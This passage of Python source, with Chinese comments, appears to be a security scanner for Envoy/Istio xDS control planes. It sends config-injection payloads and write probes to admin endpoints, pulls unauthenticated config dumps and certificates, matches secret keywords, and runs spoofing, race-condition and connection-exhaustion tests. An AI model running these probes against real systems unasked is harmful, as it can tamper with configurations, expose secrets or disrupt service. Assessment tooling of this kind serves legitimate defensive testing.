                if hasattr(ads_pb2_grpc, attr):
                    stub = getattr(ads_pb2_grpc, attr)(channel)
                    break
            if stub is None:
                return {'status': 'ERROR', 'error': 'ADS stub not found'}
        except Exception as e:
            return {'status': 'ERROR', 'error': f'stub: {e}'}

        type_url_lds = 'type.googleapis.com/envoy.config.listener.v3.Listener'

        async def request_iter():
            # Initial DiscoveryRequest
            req = discovery_pb2.DiscoveryRequest(
                type_url=type_url_lds,
                node={'id': 'xds-analyzer', 'cluster': 'analyzer'},
                resource_names=[],
                response_nonce='',
                version_info='' 
            )
            yield req
            # Then ACKs will be yielded by outer loop via queue if any
            while False:
                yield  # pragma: no cover

        responses = None
        try:
            responses = stub.StreamAggregatedResources(request_iter())
        except Exception as e:
            return {'status': 'ERROR', 'error': f'call: {e}'}

        received = []
        last_version = ''
        last_nonce = ''
        try:
            async for resp in responses:
                # resp: DiscoveryResponse
                info = {
                    'type_url': getattr(resp, 'type_url', ''),
                    'version_info': getattr(resp, 'version_info', ''),
                    'resources': len(getattr(resp, 'resources', []))
                }
                received.append(info)
                last_version = info['version_info']
                last_nonce = getattr(resp, 'nonce', '')

                # Send ACK (best-effort)
                try:
                    ack = discovery_pb2.DiscoveryRequest(
                        type_url=info['type_url'],
                        response_nonce=last_nonce,
                        version_info=last_version,
                        node={'id': 'xds-analyzer'},
                        resource_names=[],
                    )
                    # Fire-and-forget by opening a short stream
                    stub.StreamAggregatedResources(iter([ack]))
                except Exception:
                    pass

                # Limit to a few messages
                if len(received) >= 2:
                    break
        except Exception as e:
            await channel.close()
            return {'status': 'ERROR', 'error': f'stream: {e}', 'received': received}

        await channel.close()
        return {'status': 'OK', 'target': target, 'received': received, 'last_version': last_version, 'last_nonce': last_nonce}

    # ------------------- ADS RawH2 (best-effort + stateful session) -------------------
    async def _run_ads_raw_best_effort(self, type_urls: List[str]) -> Dict:
        if not H2_AVAILABLE:
            return {'status': 'SKIPPED', 'reason': 'hyper-h2 not available'}
        try:
            port = next((p for p in self.xds_ports if await self._port_open(p)), self.target_port)
            sess = RawH2AdsSession(self.target_host, port, timeout=self.timeout)
            await sess.open()
            results = []
            for tu in type_urls[:2]:
                await sess.send_request(tu, resource_names=[])
                msgs = await sess.recv_messages(timeout=2.0)
                parsed = [sess.parse_discovery_response(m) for m in msgs]
                results.append({'status': 'OK' if msgs else 'EMPTY', 'messages': len(msgs), 'parsed': parsed[:2]})
            await sess.close()
            return {'status': 'OK', 'target': f'{self.target_host}:{port}', 'raw_h2': results}
        except Exception as e:
            return {'status': 'ERROR', 'error': str(e)}

    async def _run_ads_raw_session(self, type_urls: List[str], duration_sec: float = 8.0) -> Dict:
        if not H2_AVAILABLE:
            return {'status': 'SKIPPED', 'reason': 'hyper-h2 not available'}
        port = next((p for p in self.xds_ports if await self._port_open(p)), self.target_port)
        session = RawH2AdsSession(self.target_host, port, timeout=self.timeout)
        await session.open()
        versions: Dict[str, Dict[str, str]] = {}
        events: List[Dict] = []
        try:
            # initial subscribe
            for tu in type_urls:
                await session.send_request(tu, resource_names=[])
            start = time.time()
            while time.time() - start < duration_sec:
                msgs = await session.recv_messages(timeout=2.0)
                if not msgs:
                    continue
                for payload in msgs:
                    parsed = session.parse_discovery_response(payload)
                    tu = parsed.get('type_url')
                    nonce = parsed.get('nonce')
                    ver = parsed.get('version_info')
                    if tu:
                        versions.setdefault(tu, {})
                        versions[tu]['__version__'] = ver or ''
                    self.record_push_events(events, {'type_url': tu, 'version_info': ver, 'resources': parsed.get('resources', [])})
                    if tu and nonce is not None:
                        await session.ack(tu, version_info=ver or '', response_nonce=nonce)
        finally:
            await session.close()
        snap = self.emit_update_snapshot(versions, events)
        snap.update({'status': 'OK', 'target': f'{self.target_host}:{port}', 'mode': 'rawh2'})
        return snap

    async def _port_open(self, port: int) -> bool:
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(self.target_host, port), timeout=1.0)
            writer.close(); await writer.wait_closed()
            return True
        except Exception:
            return False
    
    def _extract_wasm_sources(self, config_text: str) -> List[Dict]:
        """提取Wasm模块源信息"""
        
        import re
        wasm_sources = []
        
        try:
            # 检测远程模块URL
            url_patterns = [
                r'"remote":\s*{[^}]*"http_uri":\s*{[^}]*"uri":\s*"([^"]+)"',
                r'"filename":\s*"([^"]+\.wasm)"',
                r'"inline_string":\s*"([^"]+)"'  # 内联Wasm代码
            ]
            
            for pattern in url_patterns:
                matches = re.findall(pattern, config_text, re.DOTALL)
                for match in matches:
                    if match.startswith('http'):
                        wasm_sources.append({
                            'type': 'remote_url',
                            'source': match,
                            'risk': 'HIGH',  # 远程模块风险高
                            'analysis_opportunity': 'Module download and reverse engineering'
                        })
                    elif match.endswith('.wasm'):
                        wasm_sources.append({
                            'type': 'local_file',
                            'source': match,
                            'risk': 'MEDIUM',
                            'analysis_opportunity': 'Local file access and analysis'
                        })
                    else:
                        wasm_sources.append({
                            'type': 'inline_code',
                            'source': match[:100] + '...' if len(match) > 100 else match,
                            'risk': 'CRITICAL',  # 内联代码最危险
                            'analysis_opportunity': 'Direct binary analysis'
                        })
        
        except Exception:
            pass
        
        return wasm_sources
    
    def _extract_wasm_configurations(self, config_text: str) -> List[Dict]:
        """提取Wasm插件配置"""
        
        import re
        plugin_configs = []
        
        try:
            # 提取插件配置块
            config_pattern = r'"config":\s*{([^}]+(?:{[^}]*}[^}]*)*?)}'
            config_matches = re.findall(config_pattern, config_text, re.DOTALL)
            
            for i, config_match in enumerate(config_matches):
                # 分析配置中的敏感信息
                sensitive_keywords = ['password', 'secret', 'token', 'key', 'auth']
                found_sensitive = [kw for kw in sensitive_keywords if kw in config_match.lower()]
                
                plugin_configs.append({
                    'config_id': f"wasm_config_{i+1}",
                    'config_content': config_match[:200] + '...' if len(config_match) > 200 else config_match,
                    'sensitive_data': found_sensitive,
                    'risk_indicators': len(found_sensitive),
                    'analysis_opportunity': 'Configuration injection testing'
                })
        
        except Exception:
            pass
        
        return plugin_configs
    
    def _analyze_wasm_attack_surface(self, sources: List[Dict], configs: List[Dict]) -> Dict:
        """分析Wasm攻击面"""
        
        attack_surface = {
            'risk_level': 'LOW',
            'attack_vectors': [],
            'immediate_opportunities': [],
            'future_analysis_targets': []
        }
        
        risk_score = 0
        
        # 基于源类型评估风险
        for source in sources:
            if source['type'] == 'remote_url':
                risk_score += 30
                attack_surface['attack_vectors'].append('Remote Wasm module download and analysis')
                attack_surface['immediate_opportunities'].append(f"Download module: {source['source']}")
            elif source['type'] == 'inline_code':
                risk_score += 40
                attack_surface['attack_vectors'].append('Inline Wasm code reverse engineering')
                attack_surface['immediate_opportunities'].append('Direct binary analysis of embedded Wasm')
            elif source['type'] == 'local_file':
                risk_score += 20
                attack_surface['attack_vectors'].append('Local Wasm file access')
        
        # 基于配置评估风险
        for config in configs:
            risk_score += config['risk_indicators'] * 10
            if config['sensitive_data']:
                attack_surface['attack_vectors'].append('Configuration injection via sensitive parameters')
        
        # 未来分析目标
        if sources:
            attack_surface['future_analysis_targets'].extend([
                'Wasm module binary reverse engineering',
                'Wasm runtime sandbox escape testing', 
                'Side-channel timing analysis of Wasm execution',
                'Memory corruption testing in Wasm runtime'
            ])
        
        # 风险等级判定
        if risk_score >= 80:
            attack_surface['risk_level'] = 'CRITICAL'
        elif risk_score >= 50:
            attack_surface['risk_level'] = 'HIGH'
        elif risk_score >= 30:
            attack_surface['risk_level'] = 'MEDIUM'
        
        attack_surface['risk_score'] = risk_score
        
        return attack_surface
    
    async def _analyze_update_patterns(self) -> Dict:
        """分析配置更新模式（真实检测）

        方法：抓取 admin stats（/stats 或 /stats/prometheus），解析 LDS/CDS/RDS/EDS 的版本、更新计数、增量标记。
        """
        update_patterns = {
            'push_updates': False,
            'poll_intervals': [],
            'incremental_updates': False,
            'full_state_updates': False,
            'evidence': {}
        }
        try:
            stats_text = await self._fetch_admin_stats()
            if stats_text:
                # Envoy 文本 stats（key:value）或 Prometheus 格式
                def has(k: str) -> bool:
                    return k in stats_text
                ev = {}
                # 推送更新：ads 接收计数
                push = any(has(k) for k in [
                    'cluster_manager.ads.config_reload',
                    'listener_manager.lds.update_success',
                    'listener_manager.lds.update_failure',
                    'http.config_reload'
                ])
                update_patterns['push_updates'] = push
                ev['push_indicators'] = push
                # 增量更新标志：ads.delta / xDS delta
                incremental = any(s in stats_text for s in ['delta', 'xds.delta', 'ads.delta'])
                update_patterns['incremental_updates'] = incremental
                ev['incremental_indicators'] = incremental
                # 全量：config_reload/active dynamic listeners/clusters 数变化
                full_state = any(s in stats_text for s in ['config_reload', 'warming', 'active_dynamic_listeners'])
                update_patterns['full_state_updates'] = full_state
                ev['full_state_indicators'] = full_state
                update_patterns['evidence'] = ev
        except Exception as e:
            update_patterns['error'] = str(e)
        return update_patterns
    
    async def _test_incremental_updates(self) -> bool:
        """测试增量更新支持（基于 stats 实证）"""
        try:
            stats = await self._fetch_admin_stats()
            if not stats:
                return False
            return any(s in stats for s in ['delta', 'xds.delta', 'ads.delta'])
        except Exception:
            return False
    
    async def _test_push_updates(self) -> bool:
        """测试推送更新支持（基于 stats 实证）"""
        try:
            stats = await self._fetch_admin_stats()
            if not stats:
                return False
            return any(k in stats for k in [
                'cluster_manager.ads', 'listener_manager.lds.update_success', 'rds.update_success'
            ])
        except Exception:
            return False
    
    async def _assess_configuration_vulnerabilities(self) -> Dict:
        """评估配置操作漏洞"""
        
        vuln_assessment = {
            'config_injection': {},
            'unauthorized_access': {},
            'configuration_disclosure': {},
            'tampering_opportunities': {}
        }
        
        try:
            # 1. 配置注入测试
            print(f"[*] Testing configuration injection vulnerabilities...")
            config_injection = await self._test_config_injection()
            vuln_assessment['config_injection'] = config_injection
            
            # 2. 未授权访问测试
            print(f"[*] Testing unauthorized access...")
            unauth_access = await self._test_unauthorized_access()
            vuln_assessment['unauthorized_access'] = unauth_access
            
            # 3. 配置信息泄露测试
            print(f"[*] Testing configuration disclosure...")
            config_disclosure = await self._test_configuration_disclosure()
            vuln_assessment['configuration_disclosure'] = config_disclosure
            
            # 4. 配置篡改机会评估
            print(f"[*] Assessing tampering opportunities...")
            tampering_opps = await self._assess_tampering_opportunities()
            vuln_assessment['tampering_opportunities'] = tampering_opps
            
        except Exception as e:
            vuln_assessment['error'] = str(e)
        
        return vuln_assessment
    
    async def _test_config_injection(self) -> Dict:
        """测试配置注入攻击"""
        
        injection_results = {
            'vulnerable': False,
            'injection_points': [],
            'successful_payloads': []
        }
        
        # 配置注入payload
        injection_payloads = [
            '{"clusters":[{"name":"malicious","connect_timeout":"5s"}]}',
            '<cluster><name>malicious</name></cluster>',
            'clusters: - name: malicious'
        ]
        
        for port in [15000, 15001]:
            for payload in injection_payloads:
                try:
                    result = await self._test_single_injection(port, payload)
                    if result['success']:
                        injection_results['vulnerable'] = True
                        injection_results['injection_points'].append(f"Port {port}")
                        injection_results['successful_payloads'].append(payload[:50])
                        
                        # 事件：发现配置注入点
                        self.emit_event('ConfigInjectionPoint', {
                            'endpoint': f"{self.target_host}:{port}/config", 
                            'payload_type': 'json_config',
                            'severity': 'HIGH'
                        })
                        
                except Exception:
                    continue
        
        return injection_results
    
    async def _test_single_injection(self, port: int, payload: str) -> Dict:
        """测试单个注入payload"""
        
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, port),
                timeout=self.timeout
            )
            
            # 尝试POST配置数据
            request = (
                f"POST /config HTTP/1.1\r\n"
                f"Host: {self.target_host}:{port}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(payload)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{payload}"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
            response_text = response.decode('utf-8', errors='ignore')
            
            writer.close()
            await writer.wait_closed()
            
            # 检查是否成功
            success = '200 OK' in response_text or '201' in response_text
            
            return {
                'success': success,
                'response': response_text[:200],
                'payload': payload[:50]
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    async def _test_unauthorized_access(self) -> Dict:
        """测试未授权访问"""
        
        access_results = {
            'admin_accessible': False,
            'config_readable': False,
            'sensitive_endpoints': []
        }
        
        sensitive_endpoints = [
            '/config_dump',
            '/stats/prometheus', 
            '/clusters',
            '/runtime',
            '/certs'
        ]
        
        for port in [15000, 15001]:
            for endpoint in sensitive_endpoints:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target_host, port),
                        timeout=self.timeout
                    )
                    
                    request = (
                        f"GET {endpoint} HTTP/1.1\r\n"
                        f"Host: {self.target_host}:{port}\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    
                    writer.write(request.encode())
                    await writer.drain()
                    
                    response = await asyncio.wait_for(reader.read(2048), timeout=3.0)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    writer.close()
                    await writer.wait_closed()
                    
                    if '200 OK' in response_text:
                        access_results['sensitive_endpoints'].append({
                            'port': port,
                            'endpoint': endpoint,
                            'accessible': True,
                            'content_length': len(response_text)
                        })
                        
                        if endpoint == '/config_dump':
                            access_results['config_readable'] = True
                        
                        access_results['admin_accessible'] = True
                
                except Exception:
                    continue
        
        return access_results
    
    async def _test_configuration_disclosure(self) -> Dict:
        """测试配置信息泄露"""
        
        disclosure_results = {
            'sensitive_info_exposed': False,
            'exposed_data_types': [],
            'risk_level': 'LOW'
        }
        
        try:
            # 尝试获取配置转储
            config_data = await self._get_configuration_dump()
            
            if config_data:
                # 分析敏感信息
                sensitive_patterns = {
                    'passwords': r'password|secret|key',
                    'tokens': r'token|auth|bearer',
                    'certificates': r'cert|crt|key|pem',
                    'internal_ips': r'\b(?:10\.|172\.|192\.168\.)',
                    'database_urls': r'://[^/]+/\w+'
                }
                
                import re
                for data_type, pattern in sensitive_patterns.items():
                    if re.search(pattern, config_data, re.IGNORECASE):
                        disclosure_results['exposed_data_types'].append(data_type)
                
                if disclosure_results['exposed_data_types']:
                    disclosure_results['sensitive_info_exposed'] = True
                    if len(disclosure_results['exposed_data_types']) >= 3:
                        disclosure_results['risk_level'] = 'HIGH'
                    elif len(disclosure_results['exposed_data_types']) >= 2:
                        disclosure_results['risk_level'] = 'MEDIUM'
        
        except Exception as e:
            disclosure_results['error'] = str(e)
        
        return disclosure_results
    
    async def _get_configuration_dump(self) -> Optional[str]:
        """获取配置转储"""
        
        for port in [15000, 15001]:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, port),
                    timeout=self.timeout
                )
                
                request = (
                    f"GET /config_dump HTTP/1.1\r\n"
                    f"Host: {self.target_host}:{port}\r\n"
                    f"Connection: close\r\n\r\n"
                )
                
                writer.write(request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(8192), timeout=5.0)
                response_text = response.decode('utf-8', errors='ignore')
                
                writer.close()
                await writer.wait_closed()
                
                if '200 OK' in response_text:
                    return response_text
                    
            except Exception:
                continue
        
        return None
    
    async def _assess_tampering_opportunities(self) -> Dict:
        """评估配置篡改机会"""
        
        tampering_assessment = {
            'write_access_possible': False,
            'weak_authentication': False,
            'configuration_endpoints': [],
            'tampering_vectors': []
        }
        
        # 检查写入访问
        write_endpoints = ['/config', '/runtime', '/clusters']
        
        for port in [15000, 15001]:
            for endpoint in write_endpoints:
                try:
                    # 测试PUT/POST方法
                    result = await self._test_write_access(port, endpoint)
                    if result['writable']:
                        tampering_assessment['write_access_possible'] = True
                        tampering_assessment['configuration_endpoints'].append({
                            'port': port,
                            'endpoint': endpoint,
                            'method': result['method']
                        })
                        
                except Exception:
                    continue
        
        # 评估篡改向量
        if tampering_assessment['write_access_possible']:
            tampering_assessment['tampering_vectors'] = [
                'Configuration injection via write endpoints',
                'Runtime parameter modification',
                'Cluster definition tampering'
            ]
        
        return tampering_assessment
    
    async def _test_write_access(self, port: int, endpoint: str) -> Dict:
        """测试写入访问"""
        
        methods = ['PUT', 'POST', 'PATCH']
        
        for method in methods:
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, port),
                    timeout=self.timeout
                )
                
                test_data = '{"test": "probe"}'
                request = (
                    f"{method} {endpoint} HTTP/1.1\r\n"
                    f"Host: {self.target_host}:{port}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(test_data)}\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{test_data}"
                )
                
                writer.write(request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
                response_text = response.decode('utf-8', errors='ignore')
                
                writer.close()
                await writer.wait_closed()
                
                # 检查响应
                if any(code in response_text for code in ['200', '201', '202']):
                    return {'writable': True, 'method': method}
                elif '405' not in response_text:  # Method not allowed
                    return {'writable': False, 'method': method}
                    
            except Exception:
                continue
        
        return {'writable': False, 'method': None}
    
    async def _test_advanced_attack_scenarios(self) -> Dict:
        """测试高级攻击场景"""
        
        attack_scenarios = {
            'control_plane_spoofing': {},
            'configuration_race_conditions': {},
            'protocol_downgrade': {},
            'resource_exhaustion': {}
        }
        
        try:
            # 1. 控制面欺骗攻击
            print(f"[*] Testing control plane spoofing...")
            spoofing_result = await self._test_control_plane_spoofing()
            attack_scenarios['control_plane_spoofing'] = spoofing_result
            
            # 2. 配置竞争条件
            print(f"[*] Testing configuration race conditions...")
            race_result = await self._test_configuration_race_conditions()
            attack_scenarios['configuration_race_conditions'] = race_result
            
            # 3. 协议降级攻击
            print(f"[*] Testing protocol downgrade...")
            downgrade_result = await self._test_protocol_downgrade()
            attack_scenarios['protocol_downgrade'] = downgrade_result
            
            # 4. 资源耗尽攻击
            print(f"[*] Testing resource exhaustion...")
            exhaustion_result = await self._test_resource_exhaustion()
            attack_scenarios['resource_exhaustion'] = exhaustion_result
            
        except Exception as e:
            attack_scenarios['error'] = str(e)
        
        return attack_scenarios
    
    async def _test_control_plane_spoofing(self) -> Dict:
        """测试控制面欺骗攻击（基于真实证据）：
        - 若 ADS 可在明文/无鉴权下建立，判为高风险
        - 从 /config_dump 解析 xDS cluster 的传输安全（transport_socket）
        - 若 Admin 未鉴权且可写入（前置检测），组合判为可被劫持
        """
        spoofing_results = {
            'spoofing_possible': False,
            'risk_factors': [],
            'evidence': {}
        }
        try:
            # 1) 尝试不启用 TLS 建立 ADS（如果成功，视为"可被冒充"信号）
            if GRPC_AVAILABLE and ads_pb2_grpc and discovery_pb2:
                sess = await self.connect_ads_stream(type_urls=[self.TYPE_URLS['LDS']], use_tls=False, duration_sec=1.5)
                if sess.get('status') == 'OK':
                    spoofing_results['risk_factors'].append('ADS_insecure_channel')
                    spoofing_results['evidence']['ads_target'] = sess.get('target')
            # 2) Admin 配置分析：传输安全
            cfg = await self._get_configuration_dump()
            if cfg:
                parsed = self.parse_config_dump(cfg)
                spoofing_results['evidence']['config_types'] = parsed.get('types', [])
                # 明文上游线索（粗略关键词）
                lower = cfg.lower()
                if 'transport_socket' not in lower and ('xds' in lower or 'ads' in lower):
                    spoofing_results['risk_factors'].append('xds_cluster_no_tls')
            # 3) Admin 是否未鉴权
            unauth = await self._test_unauthorized_access()
            if unauth.get('admin_accessible'):
                spoofing_results['risk_factors'].append('admin_unauthenticated')
            # 4) 综合判断
            spoofing_results['spoofing_possible'] = any(r in spoofing_results['risk_factors'] for r in ['ADS_insecure_channel','xds_cluster_no_tls'])
            return spoofing_results
        except Exception as e:
            return {'spoofing_possible': False, 'error': str(e)}
    
    async def _attempt_config_spoofing(self, port: int, config: Dict) -> Dict:
        """尝试配置欺骗"""
        
        try:
            config_json = json.dumps(config)
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, port),
                timeout=self.timeout
            )
            
            request = (
                f"POST /v2/discovery:clusters HTTP/1.1\r\n"
                f"Host: {self.target_host}:{port}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(config_json)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{config_json}"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
            response_text = response.decode('utf-8', errors='ignore')
            
            writer.close()
            await writer.wait_closed()
            
            success = any(code in response_text for code in ['200', '201', '202'])
            
            return {
                'success': success,
                'response': response_text[:200]
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    async def _test_configuration_race_conditions(self) -> Dict:
        """测试配置竞争条件（基于 ADS 会话的 ACK/资源名抖动）"""
        race_results = {
            'race_condition_detected': False,
            'sequence_issues': [],
            'observations': []
        }
        if not (GRPC_AVAILABLE and ads_pb2_grpc and discovery_pb2):
            race_results['skipped'] = 'grpc/proto missing'
            return race_results
        try:
            channel, target = await self.tls_mtls_setup(use_tls=False)
            # Stub
            if hasattr(ads_pb2_grpc, 'AggregatedDiscoveryServiceStub'):
                stub = ads_pb2_grpc.AggregatedDiscoveryServiceStub(channel)
            else:
                await channel.close()
                race_results['error'] = 'ADS stub not found'
                return race_results
            outq: asyncio.Queue = asyncio.Queue()
            # 快速抖动资源订阅
            lds = self.TYPE_URLS['LDS']
            await outq.put(self.serialize_discovery_request(lds, []))
            await outq.put(self.serialize_discovery_request(lds, ['listener-a']))
            await outq.put(self.serialize_discovery_request(lds, ['listener-b']))
            await outq.put(self.serialize_discovery_request(lds, []))

            seq: List[Tuple[str, str]] = []  # (nonce, version)

            async def req_iter():
                while True:
                    try:
                        item = await asyncio.wait_for(outq.get(), timeout=2.0)
                        yield item
                    except asyncio.TimeoutError:
                        break

            call = stub.StreamAggregatedResources(req_iter())
            try:
                async for resp in call:
                    nonce = getattr(resp, 'nonce', '')
                    version = getattr(resp, 'version_info', '')
                    seq.append((nonce, version))
                    # ACK 当前
                    ack = self.serialize_discovery_request(lds, [], response_nonce=nonce, version_info=version)
                    await outq.put(ack)
                    if len(seq) >= 4:
                        break
            except Exception as e:
                race_results['error'] = f'stream: {e}'
                await channel.close()
                return race_results
            await channel.close()
            # 简单一致性检查：nonce 是否单调变化，版本是否出现回退
            nonces = [n for n, _ in seq]
            versions = [v for _, v in seq]
            if len(set(nonces)) != len(nonces):
                race_results['race_condition_detected'] = True
                race_results['sequence_issues'].append('duplicate_nonce')
            for i in range(1, len(versions)):
                if versions[i] and versions[i-1] and versions[i] < versions[i-1]:
                    race_results['race_condition_detected'] = True
                    race_results['sequence_issues'].append('version_rollback')
            race_results['observations'] = {'seq': seq, 'target': target}
            return race_results
        except Exception as e:
            return {'race_condition_detected': False, 'error': str(e)}

    async def _fetch_admin_stats(self) -> Optional[str]:
        """抓取 admin stats 文本（/stats 或 /stats/prometheus）"""
        for port in [15000, 15001, self.target_port]:
            for ep in ['/stats', '/stats/prometheus']:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target_host, port),
                        timeout=self.timeout
                    )
                    req = (
                        f"GET {ep} HTTP/1.1\r\n"
                        f"Host: {self.target_host}:{port}\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    writer.write(req.encode()); await writer.drain()
                    resp = await asyncio.wait_for(reader.read(65536), timeout=5.0)
                    writer.close(); await writer.wait_closed()
                    text = resp.decode('utf-8', errors='ignore')
                    if '200 OK' in text:
                        return text
                except Exception:
                    continue
        return None

    def _parse_admin_stats_text(self, stats_text: str) -> Dict[str, float]:
        """解析 Envoy admin /stats 文本或 Prometheus 格式为字典。"""
        metrics: Dict[str, float] = {}
        try:
            lines = stats_text.splitlines()
            for ln in lines:
                ln = ln.strip()
                if not ln:
                    continue
                # Prometheus 格式：name{labels} value 或 name value
                if ' ' in ln and not ln.startswith('#'):
                    try:
                        name, val = ln.split()[:2]
                        metrics[name] = float(val)
                        continue
                    except Exception:
                        pass
                # Envoy 文本：name: value
                if ':' in ln:
                    name, val = ln.split(':', 1)
                    try:
                        metrics[name.strip()] = float(val.strip())
                    except Exception:
                        # 非数字，跳过
                        pass
        except Exception:
            pass
        return metrics

    def _compare_stats_deltas(self, before: str, after: str, prefixes: List[str]) -> Dict[str, float]:
        """对比指定前缀的指标增量。"""
        try:
            b = self._parse_admin_stats_text(before) if before else {}
            a = self._parse_admin_stats_text(after) if after else {}
            delta: Dict[str, float] = {}
            for k, v in a.items():
                if any(k.startswith(pfx) for pfx in prefixes):
                    delta[k] = v - b.get(k, 0.0)
            return delta
        except Exception:
            return {}

    
    async def _concurrent_config_update(self, config_id: str) -> Dict:
        """并发配置更新"""
        
        try:
            config_data = f'{{"test_config": "{config_id}", "timestamp": {time.time()}}}'
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, 15000),
                timeout=self.timeout
            )
            
            request = (
                f"POST /config HTTP/1.1\r\n"
                f"Host: {self.target_host}:15000\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(config_data)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{config_data}"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
            response_text = response.decode('utf-8', errors='ignore')
            
            writer.close()
            await writer.wait_closed()
            
            return {
                'success': '200' in response_text,
                'config_id': config_id,
                'response': response_text[:100]
            }
            
        except Exception as e:
            return {
                'success': False,
                'config_id': config_id,
                'error': str(e)
            }
    
    async def _test_protocol_downgrade(self) -> Dict:
        """测试协议降级风险（基于 ALPN + ADS）"""
        downgrade_results = {
            'downgrade_possible': False,
            'supported_versions': [],
            'weak_protocols': [],
            'evidence': {}
        }
        protocols = [
            ('HTTP/1.1', 'http'),
            ('HTTP/2', 'h2'),
            ('gRPC', 'grpc')
        ]
        for protocol_name, protocol_id in protocols:
            try:
                result = await self._test_protocol_support(protocol_name, protocol_id)
                if result['supported']:
                    downgrade_results['supported_versions'].append(protocol_name)
                    if protocol_name == 'HTTP/1.1':
                        downgrade_results['weak_protocols'].append('HTTP/1.1')
                        downgrade_results['downgrade_possible'] = True
                    if 'details' in result:
                        downgrade_results['evidence'][protocol_name] = result['details']
            except Exception:
                continue
        return downgrade_results
    
    async def _test_protocol_support(self, protocol_name: str, protocol_id: str) -> Dict:
        """测试协议支持（改为 ALPN/H2 + ADS 探测）"""
        try:
            if protocol_name == 'HTTP/2':
                alpn = await self._alpn_h2_check(self.target_port)
                return {'supported': alpn.get('h2', False), 'protocol': protocol_name, 'details': alpn}
            if protocol_name == 'gRPC':
                if GRPC_AVAILABLE and ads_pb2_grpc and discovery_pb2:
                    sess = await self.connect_ads_stream(type_urls=[self.TYPE_URLS['LDS']], duration_sec=1.5)
                    return {'supported': sess.get('status') == 'OK', 'protocol': protocol_name}
                return {'supported': False, 'protocol': protocol_name, 'details': 'grpc/proto missing'}
            if protocol_name == 'HTTP/1.1':
                # 保留基本探测
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(self.target_host, self.target_port),
                    timeout=self.timeout
                )
                request = (
                    f"GET /stats HTTP/1.1\r\n"
                    f"Host: {self.target_host}:{self.target_port}\r\n"
                    f"Connection: close\r\n\r\n"
                )
                writer.write(request.encode()); await writer.drain()
                response = await asyncio.wait_for(reader.read(512), timeout=3.0)
                response_text = response.decode('utf-8', errors='ignore')
                writer.close(); await writer.wait_closed()
                return {'supported': 'HTTP/1.1' in response_text or '200 OK' in response_text, 'protocol': protocol_name}
            return {'supported': False, 'protocol': protocol_name}
        except Exception:
            return {'supported': False, 'protocol': protocol_name}
    
    async def _test_resource_exhaustion(self) -> Dict:
        """测试资源耗尽攻击（结合 /stats 指标验证）"""
        exhaustion_results = {
            'connection_exhaustion': False,
            'memory_exhaustion': False,
            'cpu_exhaustion': False,
            'successful_vectors': [],
            'metrics': {}
        }
        try:
            # 1. 连接耗尽测试
            print(f"[*] Testing connection exhaustion...")
            baseline_stats = await self._fetch_admin_stats()
            conn_result = await self._test_connection_exhaustion()
            post_stats = await self._fetch_admin_stats()
            exhaustion_results['connection_exhaustion'] = conn_result['vulnerable']
            if conn_result['vulnerable']:
                exhaustion_results['successful_vectors'].append('Connection flooding')
            exhaustion_results['metrics']['connections_opened'] = conn_result.get('max_connections_achieved')
            # 提取更细指标（连接、熔断、过载管理）
            if baseline_stats and post_stats:
                prefixes = [
                    'listener_manager.',
                    'http.admin.',
                    'overload_manager.',
                    'cluster_manager.cds.',
                    'cluster.',  # circuit breakers
                ]
                exhaustion_results['metrics']['stats_deltas'] = self._compare_stats_deltas(baseline_stats, post_stats, prefixes)

            # 2. 内存耗尽测试 
            print(f"[*] Testing memory exhaustion...")
            mem_result = await self._test_memory_exhaustion()
            exhaustion_results['memory_exhaustion'] = mem_result['vulnerable']
            if mem_result['vulnerable']:
                exhaustion_results['successful_vectors'].append('Large payload injection')
            exhaustion_results['metrics']['payload_size'] = mem_result.get('payload_size', 0)
        except Exception as e:
            exhaustion_results['error'] = str(e)
        return exhaustion_results
    
    async def _test_connection_exhaustion(self) -> Dict:
        """测试连接耗尽"""
        try:
            # 选择端口：优先发现的开放端口
            try_ports: List[int] = []
            try:
                hint = await self.discover_xds_endpoints()
                if hint.get('ports_open'):
                    try_ports = hint['ports_open']
            except Exception:
                pass
            if not try_ports:
                try_ports = [self.target_port]

            max_connections = 20
            active_connections = []
            for i in range(max_connections):
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.target_host, try_ports[0]),
                        timeout=2.0
                    )
                    active_connections.append((reader, writer))
                except Exception:
                    break
            await asyncio.sleep(2.0)
            for reader, writer in active_connections:
                try:
                    writer.close(); await writer.wait_closed()
                except Exception:
                    pass
            vulnerable = len(active_connections) >= max_connections * 0.8
            return {
                'vulnerable': vulnerable,
                'max_connections_achieved': len(active_connections),
                'port': try_ports[0],
                'evidence': f"Successfully opened {len(active_connections)} concurrent connections on port {try_ports[0]}"
            }
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}
    
